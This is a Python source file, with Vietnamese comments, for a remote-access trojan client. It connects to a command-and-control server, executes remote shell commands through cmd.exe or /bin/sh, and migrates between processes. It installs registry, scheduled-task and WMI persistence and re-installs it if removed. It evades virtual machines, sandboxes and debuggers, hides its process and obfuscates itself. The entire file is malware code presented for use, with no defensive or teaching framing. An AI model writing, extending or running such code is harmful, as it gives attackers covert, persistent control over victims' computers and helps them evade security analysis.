import socket
import ssl
import json
import threading
import subprocess
import os
import sys
import time
from datetime import datetime
import psutil

from utils.anti_vm import VMDetector
from utils.code_obfuscation import Obfuscator
from utils.advanced_crypto import CryptoManager
from utils.memory_protection import MemoryProtector
from utils.network_protection import NetworkProtector
from utils.cert_pinning import CertificatePinner
from utils.advanced_protection import ProcessProtector
from payload.modules.persistence import Persistence
from payload.modules.process_migration import ProcessMigrator

class Client:
    def __init__(self, host='localhost', port=4444):
        self.host = host
        self.port = port
        self.connected = False
        self.session_key = None
        
        # Khởi tạo các components
        self.crypto = CryptoManager()
        self.memory_protector = MemoryProtector()
        self.network_protector = NetworkProtector()
        self.cert_pinner = CertificatePinner()
        self.process_protector = ProcessProtector()
        self.persistence = Persistence()
        self.migrator = ProcessMigrator()
        
        # Anti-analysis
        if not self.check_environment():
            sys.exit(1)
            
        # Stealth mode
        self.enable_stealth_mode()
        
        # Shell capability
        self.shell = None
        
    def check_environment(self):
        """Kiểm tra môi trường chạy"""
        try:
            vm_detector = VMDetector()
            
            # Kiểm tra VM
            if vm_detector.detect_vm():
                return False
                
            # Kiểm tra debugger
            if vm_detector.detect_debugger():
                return False
                
            # Kiểm tra sandbox
            if vm_detector.detect_sandbox():
                return False
                
            return True
            
        except Exception:
            return False
            
    def enable_stealth_mode(self):
        """Kích hoạt stealth mode"""
        try:
            # Ẩn process
            self.process_protector.hide_process()
            
            # Cài đặt persistence
            self.persistence.install_registry()
            self.persistence.install_task_scheduler()
            self.persistence.install_wmi()
            
            # Bảo vệ memory
            self.memory_protector.protect_memory()
            
        except Exception as e:
            print(f"Stealth mode error: {str(e)}")
            
    def connect(self):
        """Kết nối tới C&C server"""
        while True:
            try:
                # Tạo SSL context
                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
                
                # Kết nối socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket = ssl_context.wrap_socket(sock)
                self.socket.connect((self.host, self.port))
                
                # Verify server certificate
                server_cert = self.socket.getpeercert(binary_form=True)
                if not self.cert_pinner.verify_cert(server_cert):
                    raise Exception("Invalid server certificate")
                    
                # Nhận session key
                encrypted_key = self.socket.recv(4096)
                self.session_key = self.crypto.decrypt_key(encrypted_key)
                
                self.connected = True
                print(f"Connected to {self.host}:{self.port}")
                
                # Start monitoring thread
                threading.Thread(target=self.monitor_process, daemon=True).start()
                
                # Main loop
                self.handle_connection()
                
            except Exception as e:
                print(f"Connection error: {str(e)}")
                time.sleep(60)  # Retry after 1 minute
                
    def handle_connection(self):
        """Xử lý connection"""
        try:
            while self.connected:
                # Receive encrypted command
                encrypted_data = self.socket.recv(4096)
                if not encrypted_data:
                    break
                    
                # Decrypt command    
                data = self.crypto.decrypt(encrypted_data, self.session_key)
                command = json.loads(data)
                
                # Execute command
                response = self.execute_command(command)
                
                # Encrypt and send response
                encrypted_response = self.crypto.encrypt(json.dumps(response), self.session_key)
                self.socket.send(encrypted_response)
                
        except Exception as e:
            print(f"Connection error: {str(e)}")
            self.connected = False
            
    def execute_command(self, command):
        """Thực thi command"""
        try:
            cmd = command.get('command')
            
            if cmd == 'shell':
                # Interactive shell
                if not self.shell:
                    self.shell = subprocess.Popen(
                        ['cmd.exe' if os.name == 'nt' else '/bin/sh'],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        shell=True
                    )
                
                # Execute shell command
                self.shell.stdin.write(f"{command.get('data')}\n".encode())
                self.shell.stdin.flush()
                output = self.shell.stdout.readline().decode()
                return {'status': 'success', 'output': output}
                
            elif cmd == 'migrate':
                # Process migration
                target_pid = command.get('pid')
                if self.migrator.migrate(target_pid):
                    return {'status': 'success', 'message': f'Migrated to process {target_pid}'}
                return {'status': 'error', 'message': 'Migration failed'}
                
            elif cmd == 'persistence':
                # Manage persistence
                action = command.get('action')
                if action == 'install':
                    self.persistence.install_registry()
                    self.persistence.install_task_scheduler()
                    self.persistence.install_wmi()
                    return {'status': 'success', 'message': 'Persistence installed'}
                elif action == 'remove':
                    results = self.persistence.remove_persistence()
                    return {'status': 'success', 'message': results}
                elif action == 'status':
                    status = self.persistence.check_persistence()
                    return {'status': 'success', 'data': status}
                    
            elif cmd == 'sysinfo':
                # System information
                info = {
                    'hostname': socket.gethostname(),
                    'ip': socket.gethostbyname(socket.gethostname()),
                    'os': os.name,
                    'cpu': psutil.cpu_percent(),
                    'memory': psutil.virtual_memory().percent,
                    'processes': len(psutil.pids())
                }
                return {'status': 'success', 'data': info}
                
            return {'status': 'error', 'message': 'Unknown command'}
            
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
            
    def monitor_process(self):
        """Monitor process for anti-debugging"""
        while self.connected:
            try:
                # Check for debugger
                if self.process_protector.detect_debugger():
                    # Migrate to new process
                    target_pid = self.migrator.find_target_process()
                    self.migrator.migrate(target_pid)
                    
                # Check persistence
                persistence_status = self.persistence.check_persistence()
                if not all(persistence_status.values()):
                    self.persistence.install_registry()
                    self.persistence.install_task_scheduler()
                    self.persistence.install_wmi()
                    
                time.sleep(30)  # Check every 30 seconds
                
            except Exception:
                pass

if __name__ == '__main__':
    # Obfuscate code
    Obfuscator.obfuscate_self()
    
    client = Client()
    client.connect()